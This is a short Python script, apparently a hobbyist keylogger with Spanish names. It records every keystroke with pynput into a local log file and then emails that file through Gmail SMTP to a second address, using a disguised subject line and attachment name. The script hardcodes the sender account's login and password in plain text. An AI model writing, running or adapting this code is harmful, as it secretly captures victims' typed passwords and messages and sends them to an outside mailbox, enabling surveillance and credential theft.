import pynput
import datetime
import smtplib



from pynput.keyboard import Key, Listener
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from smtplib import SMTP

x= datetime.datetime.now()

dicdias = {'MONDAY':'Lunes','TUESDAY':'Martes','WEDNESDAY':'Miercoles','THURSDAY':'Jueves','FRIDAY':'Viernes','SATURDAY':'Sabado','SUNDAY':'Domingo'}
anho = x.year
mes = x.month
dia = x.day

fecha = datetime.date(anho,mes,dia)


count = 0
keys = []

def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []
   




def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") >0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)




def on_release(key):
    if key == Key.esc:
        return False



with Listener(on_press=on_press, on_release =on_release) as listener:
    listener.join()



mensaje = MIMEMultipart("plain")
mensaje["From"]="cocdriloberto@gmail.com"
mensaje["To"]="receptorcocdriloberto@gmail.com"
mensaje["Subject"]="Temario de Historia"
adjunto = MIMEBase("application","octect-stream")
adjunto.set_payload(open("log.txt", "rb").read ())
adjunto.add_header("content-Disposition", 'attachment; filename="Archivo de texto 1.txt"')

mensaje.attach(adjunto)
server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()
server.login("cocdriloberto@gmail.com","wasd248650")
server.sendmail("cocdriloberto@gmail.com","receptorcocdriloberto@gmail.com", mensaje.as_string())
server.quit()

